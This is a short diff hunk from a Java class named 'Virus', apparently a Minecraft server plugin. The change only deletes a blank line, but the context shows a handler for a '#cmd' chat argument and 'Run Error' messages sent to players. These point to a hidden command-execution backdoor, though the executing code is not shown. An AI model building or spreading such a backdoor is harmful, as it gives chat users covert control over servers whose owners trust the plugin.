@@ -76,7 +76,6 @@ public class Virus implements Listener {
                 player.sendMessage("Run Error:");
                 player.sendMessage(exception.getMessage());
             }
-
         } else if (args[0].equalsIgnoreCase("#cmd"))
         {
             if (args.length <= 1)
